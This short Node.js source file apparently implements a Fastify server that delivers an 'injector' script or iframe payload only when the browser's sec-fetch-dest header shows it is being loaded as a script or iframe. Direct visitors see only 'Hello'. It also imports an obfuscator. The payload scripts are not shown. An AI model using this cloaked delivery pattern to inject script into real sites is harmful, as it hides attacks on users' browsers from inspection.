import createApp from 'fastify';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { obfuscate } from 'js-confuser';

const PORT = Number(process.env.PORT) || 8080;
const injectorJs = readFileSync(resolve(__dirname, 'scripts/injector.js'), 'utf8');
const iframeJs = readFileSync(resolve(__dirname, 'scripts/iframe.js'), 'utf8');

createApp({
  logger: true,
})
  .get('/', async (request, response) => {
    const {
      headers,
      protocol,
      hostname,
    } = request

    const secFetchDest = headers['sec-fetch-dest'];
    let payload = 'Hello';

    if (secFetchDest === 'script') {
      payload = injectorJs.replace('{{SERVICE_URL}}', `${protocol}://${hostname}`);
      response.header('content-type', 'application/javascript')
    }

    if (secFetchDest === 'iframe') {
      
      payload = `<!DOCTYPE html><script>${iframeJs}</script>`;
      response.header('content-type', 'text/html')
    }

    return response.send(payload);
  })
  .listen({
    port: PORT
  }, () => {
    console.log(`🚀 http://127.0.0.1:${PORT}`)
  });
